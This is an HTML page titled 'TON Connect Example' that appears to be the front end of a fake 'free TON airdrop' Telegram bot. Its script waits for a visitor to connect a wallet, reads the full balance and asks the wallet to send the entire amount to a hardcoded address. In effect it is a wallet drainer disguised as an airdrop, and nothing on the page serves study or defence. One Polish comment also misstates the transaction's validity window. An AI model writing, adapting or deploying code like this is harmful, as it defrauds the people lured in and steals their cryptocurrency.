<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TON Connect Example</title>
    <script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
    <script src="https://unpkg.com/ton@latest/dist/ton.js"></script>
</head>

<body>
    <div class="center" id="ton-connect"></div>
    <script>
        const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
            manifestUrl: 'https://sh4do96.github.io/TelegramBot/tonconnect-manifest.json',
            buttonRootId: 'ton-connect'
        });

        tonConnectUI.uiOptions = {
            twaReturnUrl: 'https://t.me/FreeTonAirDrop2025_bot'
        };

        // Nasłuchuj wydarzenia połączenia portfela
        tonConnectUI.onWalletConnected(async (wallet) => {
            try {
                // Adres kontraktu docelowego
                const receiverAddress = "EQDcwc2whoTvG3Q81iztMKE1CHLZZdXGXgth2mxJ1cNmGgTi";
                
                // Pobierz saldo portfela
                const balance = await tonConnectUI.wallet.ton.getBalance(wallet.address);
                
                // Przygotuj transakcję
                const transaction = {
                    validUntil: Math.floor(Date.now() / 1000) + 360, // 60 minut ważności
                    messages: [
                        {
                            address: receiverAddress,
                            amount: balance, // Wysyłamy całe saldo
                            payload: "" // Pusty payload
                        }
                    ]
                };

                // Wyślij transakcję
                const result = await tonConnectUI.sendTransaction(transaction);
                console.log("Transakcja wysłana:", result);
                
            } catch (error) {
                console.error("Błąd podczas wysyłania transakcji:", error);
            }
        });
    </script>
</body>
